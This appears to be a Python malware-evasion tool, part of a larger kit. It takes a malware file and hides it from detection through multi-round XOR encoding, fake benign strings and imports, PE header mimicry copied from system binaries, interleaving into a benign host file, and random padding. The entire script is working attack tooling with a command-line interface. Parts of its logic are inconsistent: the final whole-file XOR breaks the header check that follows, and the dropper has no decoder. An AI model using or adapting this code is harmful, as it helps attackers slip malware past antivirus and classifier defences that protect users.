#!/usr/bin/env python3
"""
Advanced Hybrid Evasion Technique
Combines ALL techniques in strategic layers to maximize evasion.

Strategy:
1. Start with malware payload
2. Apply multi-round XOR encoding with rotating keys (obfuscate signatures)
3. Insert strategic dead code and benign imports (dilute features)
4. Modify PE headers to mimic benign executables (header mimicry)
5. Embed in advanced dropper with benign wrapper (structural evasion)
6. Add cryptographically random padding (statistical evasion)
7. Apply final PE header modifications (signature breaking)

This creates a multi-layer defense that's harder to detect.
"""

import os
import sys
import struct
import random
import secrets
from pathlib import Path

# Import our evasion tools
sys.path.insert(0, str(Path(__file__).parent))
from append_data import append_random_bytes
from pe_header_modify import PEHeaderModifier
from dead_code import BENIGN_CODE_SEQUENCES, BENIGN_IMPORTS, insert_junk_data
from encoder import rotating_xor_encode, xor_encode_partial
from dropper import create_simple_dropper, create_xor_encoded_dropper
from mimicry import extract_pe_characteristics, get_benign_samples

def cryptographic_random_bytes(size):
    """Generate cryptographically strong random bytes."""
    return secrets.token_bytes(size)

def generate_realistic_benign_data(size_kb=30):
    """
    Generate realistic benign-looking data mixing:
    - Benign code sequences
    - Import strings
    - Printable strings (paths, messages)
    - Structured random data
    """
    target_size = size_kb * 1024
    data = bytearray()
    
    benign_strings = [
        b"C:\\Windows\\System32\\\x00",
        b"KERNEL32.DLL\x00",
        b"USER32.DLL\x00",
        b"Microsoft Corporation\x00",
        b"Copyright (C) Microsoft Corporation. All rights reserved.\x00",
        b"This program cannot be run in DOS mode.\x00",
        b"GetProcAddress\x00",
        b"LoadLibraryA\x00",
        b"ExitProcess\x00",
        b"VirtualAlloc\x00",
        b"GetModuleHandleA\x00",
        b".text\x00\x00\x00",
        b".data\x00\x00\x00",
        b".rdata\x00\x00",
        b".idata\x00\x00",
        b"https://www.microsoft.com\x00",
        b"Version 10.0.19041.1\x00",
        b"en-US\x00",
    ]
    
    while len(data) < target_size:
        choice = secrets.randbelow(5)
        
        if choice == 0:
            # Add benign code sequences
            data.extend(secrets.choice(BENIGN_CODE_SEQUENCES))
        elif choice == 1:
            # Add import strings
            data.extend(secrets.choice(BENIGN_IMPORTS))
        elif choice == 2:
            # Add benign strings
            data.extend(secrets.choice(benign_strings))
        elif choice == 3:
            # Add structured zeros (common in executables)
            data.extend(b'\x00' * secrets.randbelow(64))
        else:
            # Add cryptographic random bytes
            data.extend(cryptographic_random_bytes(secrets.randbelow(128) + 16))
    
    return bytes(data[:target_size])

def multi_stage_xor_encoding(input_data, num_rounds=3):
    """
    Apply multiple rounds of XOR encoding with different key patterns.
    Each round uses a different strategy.
    """
    data = bytearray(input_data)
    keys_used = []
    
    for round_num in range(num_rounds):
        if round_num == 0:
            # Single byte XOR
            key = secrets.randbelow(255) + 1
            for i in range(len(data)):
                data[i] ^= key
            keys_used.append(('single', key))
            
        elif round_num == 1:
            # Rotating key sequence
            key_sequence = [secrets.randbelow(255) + 1 for _ in range(16)]
            for i in range(len(data)):
                data[i] ^= key_sequence[i % len(key_sequence)]
            keys_used.append(('rotating', key_sequence))
            
        else:
            # Position-based XOR (key depends on position)
            base_key = secrets.randbelow(255) + 1
            for i in range(len(data)):
                position_key = (base_key + (i % 256)) & 0xFF
                if position_key == 0:
                    position_key = 1
                data[i] ^= position_key
            keys_used.append(('position', base_key))
    
    return bytes(data), keys_used

def advanced_dropper_technique(malware_data, benign_file_path):
    """
    Create advanced dropper with:
    - Benign file wrapper
    - XOR encoded payload
    - Randomized markers
    - Interleaved chunks
    """
    with open(benign_file_path, 'rb') as f:
        benign_data = f.read()
    
    # Multi-stage encode the malware
    encoded_malware, keys = multi_stage_xor_encoding(malware_data, num_rounds=3)
    
    # Create random marker (harder to detect)
    marker = cryptographic_random_bytes(32)
    
    # Interleave benign and malware data
    chunk_size = secrets.randbelow(512) + 512  # Random chunk size 512-1024
    
    dropper_data = bytearray()
    
    # Add benign header (larger portion)
    benign_header_size = min(len(benign_data) // 2, 50000)
    dropper_data.extend(benign_data[:benign_header_size])
    
    # Add marker
    dropper_data.extend(marker)
    
    # Add encoded payload in chunks interleaved with benign data
    encoded_chunks = [encoded_malware[i:i+chunk_size] for i in range(0, len(encoded_malware), chunk_size)]
    benign_chunks = [benign_data[i:i+chunk_size] for i in range(benign_header_size, len(benign_data), chunk_size)]
    
    for i, chunk in enumerate(encoded_chunks):
        dropper_data.extend(chunk)
        # Add benign separator
        if i < len(benign_chunks):
            dropper_data.extend(benign_chunks[i][:256])  # Small benign chunk
    
    # Add benign footer
    if len(benign_data) > benign_header_size + 1000:
        dropper_data.extend(benign_data[-1000:])
    
    return bytes(dropper_data), marker, keys

def apply_advanced_hybrid_evasion(malware_file, output_file, benign_dir='/usr/bin'):
    """
    Apply the complete advanced hybrid evasion technique.
    
    This is a multi-layer approach:
    1. Multi-round XOR encoding (3 rounds with different strategies)
    2. Strategic dead code and benign imports insertion
    3. PE header mimicry from real benign executables
    4. Advanced dropper with interleaving and encoding
    5. Cryptographic random padding
    6. Final PE header modifications
    """
    malware_path = Path(malware_file)
    output_path = Path(output_file)
    
    print(f"  [Layer 1] Reading malware: {malware_file}")
    with open(malware_path, 'rb') as f:
        malware_data = f.read()
    
    original_size = len(malware_data)
    modifications = []
    
    # LAYER 1: Initial XOR encoding (partial, skip headers)
    print(f"  [Layer 2] Applying partial XOR encoding...")
    layer1_data = bytearray(malware_data)
    if len(layer1_data) > 1024:
        xor_key = secrets.randbelow(255) + 1
        for i in range(1024, len(layer1_data)):  # Skip first 1024 bytes (headers)
            layer1_data[i] ^= xor_key
        modifications.append(f"Partial XOR encoding (key: {xor_key:#x})")
    
    # LAYER 2: Insert strategic dead code
    print(f"  [Layer 3] Inserting benign code and imports...")
    benign_data = generate_realistic_benign_data(size_kb=25)
    layer2_data = bytes(layer1_data) + benign_data
    modifications.append(f"Added {len(benign_data)} bytes of realistic benign data")
    
    # LAYER 3: PE Header mimicry (if PE file)
    print(f"  [Layer 4] Attempting PE header mimicry...")
    try:
        if layer2_data[:2] == b'MZ':
            benign_samples = get_benign_samples(benign_dir, count=5)
            if benign_samples:
                benign_template = secrets.choice(benign_samples)
                benign_chars = extract_pe_characteristics(benign_template)
                
                if benign_chars:
                    layer3_data = bytearray(layer2_data)
                    pe_offset = struct.unpack('<I', layer3_data[0x3C:0x40])[0]
                    
                    if pe_offset + 24 < len(layer3_data):
                        coff_offset = pe_offset + 4
                        # Mimic timestamp
                        struct.pack_into('<I', layer3_data, coff_offset + 4, benign_chars['timestamp'])
                        # Mimic characteristics
                        struct.pack_into('<H', layer3_data, coff_offset + 18, benign_chars['characteristics'])
                        modifications.append(f"PE headers mimicked from {benign_template.name}")
                        layer2_data = bytes(layer3_data)
    except Exception as e:
        print(f"    PE mimicry failed (not critical): {e}")
    
    # LAYER 4: Advanced dropper with multi-stage encoding
    print(f"  [Layer 5] Creating advanced dropper with interleaving...")
    benign_samples = get_benign_samples(benign_dir, count=10)
    if benign_samples:
        benign_dropper_host = secrets.choice(benign_samples)
    else:
        benign_dropper_host = Path(benign_dir) / "ls"
    
    dropper_data, marker, xor_keys = advanced_dropper_technique(layer2_data, benign_dropper_host)
    modifications.append(f"Advanced dropper with {benign_dropper_host.name}")
    modifications.append(f"Multi-stage XOR encoding: {len(xor_keys)} rounds")
    
    # LAYER 5: Add cryptographic random padding
    print(f"  [Layer 6] Adding cryptographic random padding...")
    padding_size = secrets.randbelow(20) + 30  # 30-50 KB
    crypto_padding = cryptographic_random_bytes(padding_size * 1024)
    layer5_data = dropper_data + crypto_padding
    modifications.append(f"Added {padding_size} KB cryptographic random padding")
    
    # LAYER 6: Final XOR encoding on the entire payload
    print(f"  [Layer 7] Final obfuscation layer...")
    final_data, final_keys = multi_stage_xor_encoding(layer5_data, num_rounds=2)
    modifications.append(f"Final multi-round XOR encoding: {len(final_keys)} rounds")
    
    # LAYER 7: PE header modifications if still a PE
    print(f"  [Layer 8] Final PE header modifications...")
    try:
        if final_data[:2] == b'MZ':
            temp_file = output_path.with_suffix('.tmp')
            with open(temp_file, 'wb') as f:
                f.write(final_data)
            
            modifier = PEHeaderModifier(str(temp_file))
            modifier.modify_timestamp() \
                    .modify_checksum() \
                    .modify_characteristics() \
                    .modify_minor_version()
            
            result = modifier.save(str(output_path))
            temp_file.unlink()
            modifications.extend(result['modifications'])
        else:
            with open(output_path, 'wb') as f:
                f.write(final_data)
    except Exception as e:
        # If PE modification fails, just save the data
        print(f"    Final PE modification failed (not critical): {e}")
        with open(output_path, 'wb') as f:
            f.write(final_data)
    
    final_size = output_path.stat().st_size
    
    print(f"  [Complete] Advanced hybrid evasion applied!")
    print(f"    Original: {original_size:,} bytes")
    print(f"    Final: {final_size:,} bytes")
    print(f"    Layers applied: 8")
    
    return {
        'technique': 'advanced_hybrid',
        'original_size': original_size,
        'final_size': final_size,
        'layers_applied': 8,
        'modifications': modifications,
        'size_increase_percent': ((final_size - original_size) / original_size) * 100
    }

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python hybrid_advanced.py <malware_file> <output_file> [benign_dir]")
        print("\nThis applies an advanced multi-layer hybrid evasion technique combining:")
        print("  1. Multi-stage XOR encoding (3+ rounds)")
        print("  2. Realistic benign code/import injection")
        print("  3. PE header mimicry from real benign files")
        print("  4. Advanced dropper with interleaving")
        print("  5. Cryptographic random padding")
        print("  6. Final obfuscation layers")
        print("  7. PE header modifications")
        sys.exit(1)
    
    malware_file = sys.argv[1]
    output_file = sys.argv[2]
    benign_dir = sys.argv[3] if len(sys.argv) > 3 else '/usr/bin'
    
    result = apply_advanced_hybrid_evasion(malware_file, output_file, benign_dir)
    
    print(f"\n{'='*70}")
    print(f"Advanced Hybrid Evasion Complete!")
    print(f"{'='*70}")
    print(f"Output: {output_file}")
    print(f"Original size: {result['original_size']:,} bytes")
    print(f"Final size: {result['final_size']:,} bytes")
    print(f"Size increase: {result['size_increase_percent']:.1f}%")
    print(f"\nModifications applied:")
    for i, mod in enumerate(result['modifications'], 1):
        print(f"  {i}. {mod}")

